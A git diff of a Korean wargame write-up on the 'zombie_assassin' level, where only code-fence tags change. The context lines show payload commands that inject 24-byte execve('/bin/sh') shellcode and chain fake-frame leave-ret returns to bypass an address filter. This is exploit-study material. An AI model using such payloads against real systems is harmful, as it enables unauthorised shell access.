@@ -55,7 +55,7 @@ main(int argc, char *argv[])
 
 분기문을 통해서 '\xbf', '\x40' 으로 시작하는 주소들을 모두 필터링 된다.
 
-```assembly
+```
 [assassin@localhost assassin]$ cat /proc/751/maps
 08048000-0817d000 r-xp 00000000 08:05 129443     /usr/bin/gdb
 0817d000-08184000 rw-p 00134000 08:05 129443     /usr/bin/gdb
@@ -85,7 +85,7 @@ shellcode(24byte) :
 
 payload 시나리오 :
 
-```sh
+```
 ./zombie_assassin `python -c print "&[buf+4]"+"shellcode(24byte)"+"\x90"*12+"&[buf-4]"+"&leave-ret 가젯"
 ```
 
@@ -109,7 +109,7 @@ payload 시나리오 :
 
 ##### Payload
 
-```sh
+```
 ./zombie_assassin `python -c 'print "\xb4\xfa\xff\xbf"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x90"*12+"\xac\xfa\xff\xbf"+"\x11\x83\x04\x08"'`
 ```
 
@@ -139,7 +139,7 @@ payload 시나리오 :
 
 ##### Payload
 
-```sh
+```
 ./zombie_assassin `python -c 'print "\xe0\x8a\x05\x40"+"\x90"*4+"\xf9\xbf\x0f\x40"+"\x90"*28+"\xac\xfa\xff\xbf"+"\x11\x83\x04\x08"'`
 ```
 
